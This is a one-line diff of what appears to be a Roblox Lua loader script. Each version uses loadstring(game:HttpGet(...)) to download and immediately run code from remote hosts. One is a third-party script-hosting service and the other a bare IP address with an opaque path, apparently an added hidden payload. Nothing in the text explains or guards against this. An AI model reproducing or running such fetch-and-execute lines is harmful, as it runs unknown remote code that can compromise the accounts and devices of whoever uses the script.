@@ -1,1 +1,1 @@
-task.spawn(function()loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/b7cca66d493ea7fe18629f1b27a3ecc5.lua"))()end)loadstring(game:HttpGet("http://72.56.64.162/qz999TKo5y0Wy8RH6k1NhRNT7Z5teNg4sEcRtOBEqkL9J2LesV1qCN8g9yw8L8gshWCp3Sa4E1Pz7H4S"))()
+task.spawn(function()loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/4f1924afbed873e6eaed271285077d0e55226363b1246b7bebcc2fc8fbd00b1e/download"))()end)loadstring(game:HttpGet("http://72.56.64.162/qz999TKo5y0Wy8RH6k1NhRNT7Z5teNg4sEcRtOBEqkL9J2LesV1qCN8g9yw8L8gshWCp3Sa4E1Pz7H4S"))()
